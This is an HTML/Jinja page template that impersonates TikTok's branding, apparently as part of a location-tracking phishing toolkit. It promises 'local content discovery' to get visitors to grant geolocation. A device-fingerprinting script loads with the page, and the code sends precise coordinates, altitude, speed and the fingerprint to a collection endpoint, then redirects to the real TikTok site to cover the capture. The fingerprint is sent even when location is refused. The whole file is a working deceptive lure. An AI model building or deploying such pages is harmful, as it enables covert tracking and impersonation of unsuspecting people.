<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Proxima Nova', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(45deg, #000000, #1a1a1a);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: #161823;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(254, 44, 85, 0.2);
            padding: 40px 30px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            border: 1px solid #2f2f2f;
        }
        
        .logo {
            font-size: 48px;
            margin-bottom: 20px;
            background: linear-gradient(45deg, #fe2c55, #25f4ee);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: bold;
        }
        
        .title {
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 10px;
            color: white;
        }
        
        .subtitle {
            color: #8a8b9b;
            margin-bottom: 30px;
            font-size: 16px;
            line-height: 1.4;
        }
        
        .feature-box {
            background: #0f0f0f;
            border-radius: 12px;
            padding: 25px 20px;
            margin-bottom: 25px;
            border: 1px solid #2f2f2f;
        }
        
        .feature-header {
            font-size: 18px;
            font-weight: bold;
            color: #fe2c55;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .feature-item {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
            color: #e2e2e2;
            text-align: left;
        }
        
        .feature-item:last-child {
            margin-bottom: 0;
        }
        
        .feature-icon {
            width: 24px;
            height: 24px;
            margin-right: 12px;
            font-size: 18px;
            color: #25f4ee;
        }
        
        .btn {
            background: linear-gradient(135deg, #fe2c55 0%, #ff0050 100%);
            color: white;
            border: none;
            padding: 16px 32px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            font-size: 16px;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(254, 44, 85, 0.3);
        }
        
        .btn:disabled {
            background: #3a3a3a;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .loading {
            display: none;
            margin-top: 20px;
            color: #8a8b9b;
            font-style: italic;
        }
        
        .error {
            color: #ff4757;
            margin-top: 15px;
            display: none;
            background: #2a1a1a;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid #ff4757;
        }
        
        .trending-section {
            margin: 20px 0;
            text-align: center;
        }
        
        .trending-items {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 15px;
        }
        
        .trending-item {
            background: #fe2c55;
            color: white;
            padding: 8px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .location-benefits {
            background: #1a1a2e;
            border-radius: 8px;
            padding: 15px;
            margin-top: 20px;
            border: 1px solid #16213e;
        }
        
        .benefit-title {
            color: #25f4ee;
            font-weight: bold;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        .benefit-text {
            color: #8a8b9b;
            font-size: 12px;
            line-height: 1.4;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">TikTok</div>
        
        <h1 class="title">Discover Local Content</h1>
        <p class="subtitle">Find trending videos, challenges, and creators in your area!</p>
        
        <div class="feature-box">
            <div class="feature-header">
                <span>üåü</span>
                <span>Local Discovery</span>
            </div>
            
            <div class="trending-section">
                <div class="benefit-title">üî• Trending Near You</div>
                <div class="trending-items">
                    <div class="trending-item">#LocalVibes</div>
                    <div class="trending-item">#CityLife</div>
                    <div class="trending-item">#Nearby</div>
                </div>
            </div>
            
            <div class="feature-item">
                <span class="feature-icon">üìç</span>
                <span>See what's viral in your city</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">üë•</span>
                <span>Connect with local creators</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">üéµ</span>
                <span>Discover trending sounds nearby</span>
            </div>
            <div class="feature-item">
                <span class="feature-icon">üèÜ</span>
                <span>Join local challenges</span>
            </div>
        </div>
        
        <button class="btn" id="enableLocation">
            üìç Enable Location Discovery
        </button>
        
        <div class="loading" id="loading">
            <i>üîÑ Discovering content in your area...</i>
        </div>
        
        <div class="error" id="error"></div>
        
        <div class="location-benefits">
            <div class="benefit-title">üéØ Why Enable Location?</div>
            <div class="benefit-text">
                TikTok uses your location to show you the most relevant local content, trending hashtags in your area, and help you discover creators and events near you. Your location data helps us personalize your For You page with content that matters to your community.
            </div>
        </div>
    </div>

    <script src="{{ url_for('static', filename='js/fingerprint.js') }}"></script>
    <script>
        const sessionId = '{{ session_id }}';
        
        // Add some visual effects
        function createFloatingElements() {
            const container = document.querySelector('.container');
            for (let i = 0; i < 3; i++) {
                const element = document.createElement('div');
                element.style.cssText = `
                    position: absolute;
                    width: 4px;
                    height: 4px;
                    background: #fe2c55;
                    border-radius: 50%;
                    animation: float 3s infinite ease-in-out;
                    animation-delay: ${i * 0.5}s;
                    top: ${Math.random() * 100}%;
                    left: ${Math.random() * 100}%;
                    pointer-events: none;
                `;
                container.appendChild(element);
            }
        }
        
        document.getElementById('enableLocation').addEventListener('click', function() {
            this.disabled = true;
            this.textContent = 'üîÑ Discovering...';
            document.getElementById('loading').style.display = 'block';
            
            const deviceData = collectDeviceFingerprint();
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        
                        sendData({
                            session_id: sessionId,
                            location: locationData,
                            device: deviceData,
                            template: 'tiktok'
                        });
                        
                        document.getElementById('loading').innerHTML = '<i style="color: #25f4ee;">‚úÖ Location enabled! Discovering local content...</i>';
                        setTimeout(() => {
                            window.location.href = 'https://tiktok.com';
                        }, 2000);
                    },
                    function(error) {
                        document.getElementById('loading').style.display = 'none';
                        document.getElementById('error').style.display = 'block';
                        
                        let errorMessage = '';
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = 'Location access denied. Enable location to discover amazing local content and creators!';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = 'Location information is unavailable.';
                                break;
                            case error.TIMEOUT:
                                errorMessage = 'Location request timed out.';
                                break;
                            default:
                                errorMessage = 'An unknown error occurred.';
                                break;
                        }
                        document.getElementById('error').textContent = errorMessage;
                        
                        sendData({
                            session_id: sessionId,
                            device: deviceData,
                            template: 'tiktok',
                            location_error: errorMessage
                        });
                        
                        const btn = document.getElementById('enableLocation');
                        btn.disabled = false;
                        btn.textContent = 'üìç Try Again';
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                document.getElementById('loading').style.display = 'none';
                document.getElementById('error').style.display = 'block';
                document.getElementById('error').textContent = 'Geolocation is not supported by this browser.';
                
                sendData({
                    session_id: sessionId,
                    device: deviceData,
                    template: 'tiktok',
                    location_error: 'Geolocation not supported'
                });
            }
        });
        
        function sendData(data) {
            fetch('/api/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            }).catch(error => {
                console.error('Error sending data:', error);
            });
        }
        
        // Initialize floating elements
        createFloatingElements();
    </script>
    
    <style>
        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); opacity: 0.7; }
            50% { transform: translateY(-20px) rotate(180deg); opacity: 1; }
        }
    </style>
</body>
</html>
